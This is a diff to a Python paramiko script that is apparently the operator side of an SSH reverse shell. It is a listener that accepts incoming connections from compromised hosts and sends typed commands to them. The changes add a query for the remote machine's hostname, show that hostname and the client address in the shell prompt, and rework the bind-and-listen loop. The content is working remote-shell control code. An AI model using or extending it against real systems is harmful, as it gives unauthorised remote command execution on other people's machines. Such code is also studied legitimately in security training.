@@ -28,7 +28,7 @@ class Server(paramiko.ServerInterface):
         return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
 
 #ssh client handler
-def client_handler(client_socket):
+def client_handler(client_socket,addr):
     try:
         #bind client socket to ssh server session and add rsa key
         ssh_session = paramiko.Transport(client_socket)
@@ -51,8 +51,10 @@ def client_handler(client_socket):
             print("[*] SSH Client Authenticated")
 #ssh channel is established. We can start the shell
             #and send commands from input
+            ssh_channel.send('hostname')
+            remhostname = ssh_channel.recv(1024).decode('utf-8').rstrip('\n\r ')
         while not ssh_channel.closed:
-            command = input("Remote Shell:# ").rstrip()
+            command = input(f"<{remhostname}:{addr}>:$ ").rstrip()
             if len(command):
                 if command != "exit":
                     ssh_channel.send(command)
@@ -74,23 +76,23 @@ def client_handler(client_socket):
             print("[!] Error closing SSH session")
         else:
             print("[*] SSH session closed")
-            sys.exit(1)
 
 #ssh server bind and listen
 def main():
-    try:
-        server_socket.bind((server_address, server_port))
-    except:
-        print(f"[!] Bind Error for SSH Server using {server_address}:{server_socket.getsockname()[1]}")
-        sys.exit(1)
-    print(f"[*] Bind Success for SSH Server using {server_address}:{server_socket.getsockname()[1]}")
-    server_socket.listen(100)
-    print("[*] Listening")
-#Keep ssh server active and accept incoming tcp connections
     while True:
-        client_socket, addr = server_socket.accept()
-        print(f"[*] Incoming TCP Connection from {addr[0]}:{addr[1]}")
-        client_handler(client_socket)
+        try:
+            server_socket.bind((server_address, server_port))
+        except:
+            print(f"[!] Bind Error for SSH Server using {server_address}:{server_socket.getsockname()[1]}")
+            sys.exit(1)
+        print(f"[*] Bind Success for SSH Server using {server_address}:{server_socket.getsockname()[1]}")
+        server_socket.listen(100)
+        print("[*] Listening")
+#Keep ssh server active and accept incoming tcp connections
+        while True:
+            client_socket, addr = server_socket.accept()
+            print(f"[*] Incoming TCP Connection from {addr[0]}:{addr[1]}")
+            client_handler(client_socket,addr[0])
 
 if __name__ == '__main__':
     main()
